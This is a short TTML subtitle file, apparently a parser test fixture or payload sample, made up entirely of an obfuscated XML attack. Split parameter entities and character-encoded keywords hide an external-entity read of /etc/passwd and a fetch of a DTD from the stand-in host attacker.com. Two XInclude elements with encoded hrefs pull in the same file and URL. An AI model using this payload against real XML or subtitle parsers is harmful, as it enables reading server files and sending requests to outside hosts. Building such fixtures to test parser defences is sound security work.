<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE tt [
  <!ENTITY % a "file:///et">
  <!ENTITY % b "c/passwd">
  <!ENTITY % ab "%a;%b;">
  <!ENTITY % x "&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;">
  <!ENTITY % y "&#104;&#116;&#116;&#112;">
  <!ENTITY % z "%y;://attacker.com/test">
  <!ENTITY % dtd "%x; '%z;'">
  %dtd;
]>
<tt xmlns="http://www.w3.org/ns/ttml"
    xmlns:xi="http://www.w3.org/2001/XInclude">
  <body>
    <div>
      <p begin="00:00:01.000" end="00:00:02.000">&ab;</p>
      <xi:include href="&#102;&#105;&#108;&#101;:///etc/passwd" parse="text"/>
      <xi:include href="&#x68;&#x74;&#x74;&#x70;://attacker.com/test" parse="text"/>
    </div>
  </body>
</tt>
